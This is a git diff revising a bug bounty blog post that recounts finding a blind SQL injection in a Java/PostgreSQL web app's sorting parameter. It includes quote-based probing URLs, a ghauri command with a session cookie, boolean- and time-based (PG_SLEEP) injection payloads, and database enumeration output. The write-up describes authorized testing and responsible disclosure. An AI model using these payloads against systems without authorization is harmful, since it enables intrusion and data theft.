@@ -5,24 +5,24 @@ tags: [BugBounty, Infosec, SQL Injection, sqlmap]
 image:
   path: /assets/img/First_€€€€/main.webp
 ---
+## Disclaimer: This isn’t meant to teach anything new—just sharing a personal experience.
+### سَلامٌ
 
-## سَلامٌ
+I'll share in this write-up how I discovered my first €€€€ bounty.
 
-I'll share In this write-up how I discovered my first €€€€ bounty.
-
-At first, I started with a basic manual recon because the program scope was just a set of URLs related to different services, for example:
+At first, I started with basic manual recon because the program's scope was just a set of URLs related to different services, such as:
 
 - `https://ex.admin.service.example.com/`
 - `https://ex.service.service.example.com/`
 - `https://ex.abc.service.example.com/`
 
-Also, the program provided credentials to test roles.
+The program also provided credentials to test different roles.
 
-Then I browsed the sites while proxying the traffic through Burp and testing the functionalities like any normal user, but there were no interesting functionalities except the sorting one, I noticed some interesting parameters
-I already saw In some *JS* files the parameters were:
+I then browsed the sites while proxying the traffic through Burp and testing the functionalities like a normal user. However, there weren’t any interesting features—except for the sorting functionality. I noticed some intriguing parameters that I had already seen in some *JS* files:
 
-`SelectedSources` and `SelectedTemplateNames` at first I thought maybe It grabs some data from the database, so I decided to test It with some special characters
-searching for anomalies like `{", ' , \}`, and when I entered a single quote I got 500 HTTP status code `(Internal server error)` then added another single quote I got 200 HTTP status code (OK).
+`SelectedSources` and `SelectedTemplateNames`.  
+
+At first, I thought they might fetch data from a database (yeah that makes sense :D), so I decided to test them with special characters, searching for anomalies like `{", ', \}`. When I entered a single quote, I got a `500 HTTP status code (Internal Server Error)`. Adding another single quote returned a `200 HTTP status code (OK)`.
 
 ```
 https://ex.service.example.com/history?selectedSources=someSources' > 500
@@ -30,29 +30,31 @@ https://ex.service.example.com/history?selectedSources=someSources' > 500
 https://ex.service.example.com/history?selectedSources=someSources'' > 200
 ```
 
-Sometimes, I enter backslash to confirm It, but here I got 400 bad request `(It was a Java app runs on Apache tomcat so you should encode the backslash to %5c)`.
+Sometimes, I use a backslash to confirm my suspicions. In this case, I got a `400 Bad Request` (since it was a Java app running on Apache Tomcat, the backslash needed to be encoded as `%5c`).
 
-`https://ex.service.example.com/history?selectedSources=someSources\' > 400`
+```
+https://ex.service.example.com/history?selectedSources=someSources\' > 400
+```
 
-After that, I tried to run `sqlmap` to extract the database version but unfortunately, `sqlmap` didn’t extract anything except the DBMS was `PostgreSQL`, but I didn’t give up and used `ghauri` instead `https://github.com/r0oth3x49/ghauri.git`
+After that, I tried running `sqlmap` to extract the database version. Unfortunately, `sqlmap` didn’t retrieve anything except that the DBMS was `PostgreSQL`. However, I didn’t give up—I switched to `ghauri` instead:
 
-```terminal
+```
 ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs
 ```
 
-*BooM!*
+**Boom!**
 
 ```
 [09:22:32] [INFO] testing connection to the target URL
-Ghauri resumed the following injection point(s) from stored session:                                                                                                                                                                                                                                         
-Parameter: selectedSources (GET)                                                                                                                                                                                                            
+Ghauri resumed the following injection point(s) from stored session:                                                                                                                                                                                                                                          
+Parameter: selectedSources (GET)                                                                                                                                                                                                             
     Type: boolean-based blind                                                                                                                                                                                                               
     Title: OR boolean-based blind - WHERE or HAVING clause                                                                                                                                                                                  
-    Payload: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586                                                                                                                                                                      
+    Payload: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586                                                                                                                                                                       
 
-    Type: time-based blind                                                                                                                                                                                                                  
+    Type: time-based blind                                                                                                                                                                                                                   
     Title: PostgreSQL > 8.1 AND time-based blind (comment)                                                                                                                                                                                  
-    Payload: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586                                                                                                                                                                                                                                                                                                                                                                             
+    Payload: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586                                                                                                                                                                                                                                                                                                                                                                              
 [09:22:33] [INFO] testing PostgreSQL
 [09:22:34] [INFO] confirming PostgreSQL
 [09:22:34] [INFO] the back-end DBMS is PostgreSQL
@@ -68,7 +70,7 @@ available databases [3]:
 [*] information_schema
 ```
 
-I reported It and In just one hour the triager forwarded the report to the company, and they acknowledged the vulnerability.
+I reported the vulnerability, and within just one hour, the triager forwarded my report to the company. They quickly acknowledged the issue.
 
 ![main](/assets/img/First_€€€€/main.webp)
 
@@ -76,8 +78,9 @@ The next day, the company awarded me a bounty.
 
 ![accepted](/assets/img/First_€€€€/accepted.webp)
 
-*In the end, do not stick to just one tool, technique, or even a program that you don’t understand; that will burn you out. The internet is already a place filled with vulnerabilities.*
+**Final Thoughts:**  
+Don’t limit yourself to just one tool, technique, or program you don’t fully understand—it will only burn you out. The internet is already full of vulnerabilities waiting to be discovered.
 
-Twitter/X: https://x.com/MachIaVellill
+Twitter/X: [https://x.com/MachIaVellill](https://x.com/MachIaVellill)
 
-## سَلامٌ
+### سَلامٌ
